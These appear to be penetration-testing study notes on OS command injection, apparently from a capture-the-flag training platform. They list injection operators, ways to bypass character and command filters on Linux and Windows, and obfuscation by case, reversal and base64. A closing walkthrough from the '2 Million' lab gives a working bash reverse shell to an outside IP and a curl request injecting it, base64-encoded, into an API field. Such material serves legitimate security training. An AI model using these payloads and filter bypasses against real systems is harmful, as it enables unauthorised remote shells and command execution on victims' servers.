## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

---

# Linux

## Filtered Character Bypass

| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |                                                                                    |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |                                                                                    |
| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |
|                         |                                                                                    |

---

## Blacklisted Command Bypass

| Code                                                                                             | Description                         |
| ------------------------------------------------------------------------------------------------ | ----------------------------------- |
| **Character Insertion**                                                                          |                                     |
| `'` or `"`                                                                                       | Total must be even                  |
| `$@` or `\`                                                                                      | Linux only                          |
| **Case Manipulation**                                                                            |                                     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                                                               | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")`                                                               | Another variation of the technique  |
| **Reversed Commands**                                                                            |                                     |
| `echo 'whoami' \| rev`                                                                           | Reverse a string                    |
| `$(rev<<<'imaohw')`                                                                              | Execute reversed command            |
| **Encoded Commands**                                                                             |                                     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`                                                 | Encode a string with base64         |
| `bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)` | Execute b64 encoded string          |

---

# Windows

## Filtered Character Bypass

|Code|Description|
|---|---|
|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
|**Other Characters**||
|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|

---

## Blacklisted Command Bypass

| Code                                                                                                         | Description                              |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| **Character Insertion**                                                                                      |                                          |
| `'` or `"` for example w"h"o"a"m"i                                                                           | Total must be even                       |
| `^`<br>                                                                                                      | Windows only (CMD)                       |
| **Case Manipulation**                                                                                        |                                          |
| `WhoAmi`                                                                                                     | Simply send the character with odd cases |
| **Reversed Commands**                                                                                        |                                          |
| `"whoami"[-1..-20] -join ''`                                                                                 | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                                        | Execute reversed command                 |
| **Encoded Commands**                                                                                         |                                          |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string               |
### Linux Only
```bash
who$@ami
w\ho\am\i
```

### Windows Only
```cmd-session
C:\htb> who^ami

21y4d
```

> [!Tips]
> 
> It is always easier to inject our command in an input going at the end of the command, rather than in the middle of it, though both are possible
> 
> For example, the backend command runs as: "mv FROM TO". the param of the vuln is to=val&from=val.
> 
> It is easier to perform injection in the to param cause it happens later in the linux command


# From 2 Million
The command is successful and we gain command execution. Let's start a Netcat listener to catch a shell. 

```
nc -lvp 1234 
```

We can then get a shell with the following payload. 

```
bash -i >& /dev/tcp/10.10.14.4/1234 0>&1 
```

We encode the payload in Base64 and add it to the following command. 

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
```